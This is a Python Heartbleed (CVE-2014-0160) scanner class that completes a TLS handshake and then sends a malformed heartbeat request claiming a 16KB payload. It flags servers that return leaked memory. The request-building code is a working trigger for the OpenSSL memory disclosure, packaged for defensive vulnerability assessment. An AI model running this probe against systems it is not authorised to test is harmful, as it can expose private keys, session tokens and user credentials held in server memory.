"""
Heartbleed Vulnerability Scanner (CVE-2014-0160)

Heartbleed is a critical vulnerability in OpenSSL's implementation of the
TLS heartbeat extension. It allows attackers to read up to 64KB of server
memory per request, potentially exposing:
- Private keys
- Session tokens
- User credentials
- Other sensitive data in memory

This scanner sends a malformed heartbeat request and checks if the server
returns more data than it should (indicating memory disclosure).

CVSS Score: 7.5 (High)
Affected: OpenSSL 1.0.1 - 1.0.1f
"""

import socket
import struct
import logging
from typing import Dict, Any, Optional

logger = logging.getLogger(__name__)


class HeartbleedScanner:
    """
    Tests for OpenSSL Heartbleed vulnerability.

    The vulnerability works by sending a TLS heartbeat request with a
    claimed payload length much larger than the actual payload. Vulnerable
    servers will respond with the claimed length of data, reading from
    memory beyond the intended buffer.
    """

    # TLS record types
    TLS_CONTENT_TYPE_HANDSHAKE = 0x16
    TLS_CONTENT_TYPE_HEARTBEAT = 0x18
    TLS_HEARTBEAT_REQUEST = 0x01
    TLS_HEARTBEAT_RESPONSE = 0x02

    def __init__(self, timeout: int = 5):
        self.timeout = timeout

    def build_client_hello(self) -> bytes:
        """
        Build a TLS 1.1 ClientHello message with heartbeat extension enabled.

        The heartbeat extension (type 0x000f) must be included for the server
        to accept heartbeat messages.
        """
        # Random bytes (32 bytes)
        random_bytes = bytes([0x53] * 32)

        # Cipher suites - common ones that most servers support
        cipher_suites = bytes(
            [
                0xC0,
                0x14,  # TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA
                0xC0,
                0x0A,  # TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA
                0xC0,
                0x22,  # TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA
                0xC0,
                0x21,  # TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA
                0x00,
                0x39,  # TLS_DHE_RSA_WITH_AES_256_CBC_SHA
                0x00,
                0x38,  # TLS_DHE_DSS_WITH_AES_256_CBC_SHA
                0x00,
                0x88,  # TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA
                0x00,
                0x87,  # TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA
                0xC0,
                0x0F,  # TLS_ECDH_RSA_WITH_AES_256_CBC_SHA
                0xC0,
                0x05,  # TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA
                0x00,
                0x35,  # TLS_RSA_WITH_AES_256_CBC_SHA
                0x00,
                0x84,  # TLS_RSA_WITH_CAMELLIA_256_CBC_SHA
                0xC0,
                0x12,  # TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x08,  # TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x1C,  # TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x1B,  # TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA
                0x00,
                0x16,  # TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
                0x00,
                0x13,  # TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x0D,  # TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x03,  # TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA
                0x00,
                0x0A,  # TLS_RSA_WITH_3DES_EDE_CBC_SHA
                0xC0,
                0x13,  # TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA
                0xC0,
                0x09,  # TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA
                0xC0,
                0x1F,  # TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA
                0xC0,
                0x1E,  # TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA
                0x00,
                0x33,  # TLS_DHE_RSA_WITH_AES_128_CBC_SHA
                0x00,
                0x32,  # TLS_DHE_DSS_WITH_AES_128_CBC_SHA
                0x00,
                0x9A,  # TLS_DHE_RSA_WITH_SEED_CBC_SHA
                0x00,
                0x99,  # TLS_DHE_DSS_WITH_SEED_CBC_SHA
                0x00,
                0x45,  # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
                0x00,
                0x44,  # TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA
                0xC0,
                0x0E,  # TLS_ECDH_RSA_WITH_AES_128_CBC_SHA
                0xC0,
                0x04,  # TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA
                0x00,
                0x2F,  # TLS_RSA_WITH_AES_128_CBC_SHA
                0x00,
                0x96,  # TLS_RSA_WITH_SEED_CBC_SHA
                0x00,
                0x41,  # TLS_RSA_WITH_CAMELLIA_128_CBC_SHA
                0xC0,
                0x11,  # TLS_ECDHE_RSA_WITH_RC4_128_SHA
                0xC0,
                0x07,  # TLS_ECDHE_ECDSA_WITH_RC4_128_SHA
                0xC0,
                0x0C,  # TLS_ECDH_RSA_WITH_RC4_128_SHA
                0xC0,
                0x02,  # TLS_ECDH_ECDSA_WITH_RC4_128_SHA
                0x00,
                0x05,  # TLS_RSA_WITH_RC4_128_SHA
                0x00,
                0x04,  # TLS_RSA_WITH_RC4_128_MD5
                0x00,
                0x15,  # TLS_DHE_RSA_WITH_DES_CBC_SHA
                0x00,
                0x12,  # TLS_DHE_DSS_WITH_DES_CBC_SHA
                0x00,
                0x09,  # TLS_RSA_WITH_DES_CBC_SHA
                0x00,
                0x14,  # TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
                0x00,
                0x11,  # TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA
                0x00,
                0x08,  # TLS_RSA_EXPORT_WITH_DES40_CBC_SHA
                0x00,
                0x06,  # TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5
                0x00,
                0x03,  # TLS_RSA_EXPORT_WITH_RC4_40_MD5
                0x00,
                0xFF,  # TLS_EMPTY_RENEGOTIATION_INFO_SCSV
            ]
        )

        # Extensions - include heartbeat extension
        extensions = bytes(
            [
                # EC point formats
                0x00,
                0x0B,
                0x00,
                0x04,
                0x03,
                0x00,
                0x01,
                0x02,
                # Elliptic curves
                0x00,
                0x0A,
                0x00,
                0x1C,
                0x00,
                0x1A,
                0x00,
                0x17,
                0x00,
                0x19,
                0x00,
                0x1C,
                0x00,
                0x1B,
                0x00,
                0x18,
                0x00,
                0x1A,
                0x00,
                0x16,
                0x00,
                0x0E,
                0x00,
                0x0D,
                0x00,
                0x0B,
                0x00,
                0x0C,
                0x00,
                0x09,
                0x00,
                0x0A,
                # Session ticket
                0x00,
                0x23,
                0x00,
                0x00,
                # Heartbeat extension (this is key!)
                0x00,
                0x0F,
                0x00,
                0x01,
                0x01,  # heartbeat mode: peer allowed to send
            ]
        )

        # Build ClientHello handshake message
        client_hello_body = (
            bytes(
                [
                    0x03,
                    0x02,  # Client version: TLS 1.1
                ]
            )
            + random_bytes
            + bytes(
                [
                    0x00,  # Session ID length: 0
                ]
            )
            + struct.pack(">H", len(cipher_suites))
            + cipher_suites
            + bytes(
                [
                    0x01,
                    0x00,  # Compression methods: null
                ]
            )
            + struct.pack(">H", len(extensions))
            + extensions
        )

        # Handshake header
        handshake = (
            bytes([0x01])
            + struct.pack(">I", len(client_hello_body))[1:4]
            + client_hello_body
        )

        # TLS record layer
        tls_record = (
            bytes(
                [
                    self.TLS_CONTENT_TYPE_HANDSHAKE,
                    0x03,
                    0x02,  # TLS 1.1
                ]
            )
            + struct.pack(">H", len(handshake))
            + handshake
        )

        return tls_record

    def build_heartbeat_request(self, payload_length: int = 0x4000) -> bytes:
        """
        Build a malicious heartbeat request.

        The exploit: we claim a large payload length (16KB) but send almost
        no actual payload. Vulnerable servers will return payload_length bytes,
        reading from memory beyond the intended buffer.

        Args:
            payload_length: The claimed payload length (default 16KB)

        Returns:
            Malicious TLS heartbeat record
        """
        heartbeat_data = bytes(
            [
                self.TLS_HEARTBEAT_REQUEST,
                (payload_length >> 8) & 0xFF,  # Payload length high byte
                payload_length & 0xFF,  # Payload length low byte
                # Missing payload! This is the vulnerability.
            ]
        )

        tls_record = (
            bytes(
                [
                    self.TLS_CONTENT_TYPE_HEARTBEAT,
                    0x03,
                    0x02,  # TLS 1.1
                ]
            )
            + struct.pack(">H", len(heartbeat_data))
            + heartbeat_data
        )

        return tls_record

    def _receive_server_response(self, sock: socket.socket) -> bytes:
        """
        Receive TLS records until ServerHelloDone or timeout.
        """
        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                # Check for ServerHelloDone (handshake type 0x0e)
                if b"\x0e\x00\x00\x00" in response:
                    break
            except socket.timeout:
                break
        return response

    def _parse_heartbeat_response(self, data: bytes) -> Optional[int]:
        """
        Parse heartbeat response and return payload length.

        Returns None if not a valid heartbeat response.
        """
        if len(data) < 5:
            return None

        content_type = data[0]
        if content_type != self.TLS_CONTENT_TYPE_HEARTBEAT:
            return None

        record_length = struct.unpack(">H", data[3:5])[0]
        return record_length

    def test(self, hostname: str, port: int = 443) -> Dict[str, Any]:
        """
        Test target for Heartbleed vulnerability.

        Args:
            hostname: Target hostname
            port: Target port (default 443)

        Returns:
            Dictionary with vulnerability assessment results
        """
        result = {
            "vulnerable": False,
            "error": None,
            "details": None,
            "cve": "CVE-2014-0160",
            "severity": "Critical",
            "bytes_leaked": 0,
            "heartbeat_supported": False,
        }

        sock = None
        try:
            # Resolve hostname first
            addr_info = socket.getaddrinfo(
                hostname, port, socket.AF_UNSPEC, socket.SOCK_STREAM
            )
            if not addr_info:
                result["error"] = f"Could not resolve hostname: {hostname}"
                return result

            family, socktype, proto, canonname, sockaddr = addr_info[0]
            sock = socket.socket(family, socktype, proto)
            sock.settimeout(self.timeout)
            sock.connect(sockaddr)

            logger.debug(f"Connected to {hostname}:{port}")

            # Send ClientHello with heartbeat extension
            client_hello = self.build_client_hello()
            sock.send(client_hello)

            # Receive ServerHello and certificates
            server_response = self._receive_server_response(sock)

            if not server_response:
                result["error"] = "No response from server during handshake"
                return result

            logger.debug(f"Received {len(server_response)} bytes from server")

            # Send malicious heartbeat request
            heartbeat_request = self.build_heartbeat_request(0x4000)  # Request 16KB
            sock.send(heartbeat_request)

            # Check for heartbeat response
            try:
                sock.settimeout(3)  # Short timeout for heartbeat response
                heartbeat_response = sock.recv(65535)

                if len(heartbeat_response) > 0:
                    result["heartbeat_supported"] = True

                    # Check if response is larger than what we sent
                    # A proper response should be minimal (just the 3 bytes we sent)
                    # A vulnerable response will contain leaked memory
                    payload_length = self._parse_heartbeat_response(heartbeat_response)

                    if payload_length and payload_length > 24:
                        result["vulnerable"] = True
                        result["bytes_leaked"] = (
                            len(heartbeat_response) - 5
                        )  # Minus TLS header
                        result["details"] = (
                            f"Server leaked {result['bytes_leaked']} bytes of memory. "
                            "This could contain sensitive data including private keys, "
                            "session tokens, and user credentials."
                        )
                        logger.warning(
                            f"Heartbleed VULNERABLE: {hostname} leaked {result['bytes_leaked']} bytes"
                        )
                    else:
                        result["details"] = (
                            "Server supports heartbeat but is not vulnerable (patched)"
                        )
                else:
                    result["details"] = (
                        "No heartbeat response received (heartbeat may be disabled)"
                    )

            except socket.timeout:
                result["details"] = (
                    "No heartbeat response (likely patched or heartbeat disabled)"
                )

        except socket.gaierror as e:
            result["error"] = f"DNS resolution failed: {str(e)}"
        except socket.timeout:
            result["error"] = f"Connection timed out after {self.timeout} seconds"
        except ConnectionRefusedError:
            result["error"] = f"Connection refused on port {port}"
        except ConnectionResetError:
            result["error"] = "Connection reset by peer"
        except Exception as e:
            result["error"] = f"Unexpected error: {str(e)}"
            logger.exception(f"Error testing {hostname} for Heartbleed")
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass

        return result


# Convenience function for quick testing
def check_heartbleed(hostname: str, port: int = 443) -> bool:
    """Quick check if host is vulnerable to Heartbleed."""
    scanner = HeartbleedScanner()
    result = scanner.test(hostname, port)
    return result["vulnerable"]
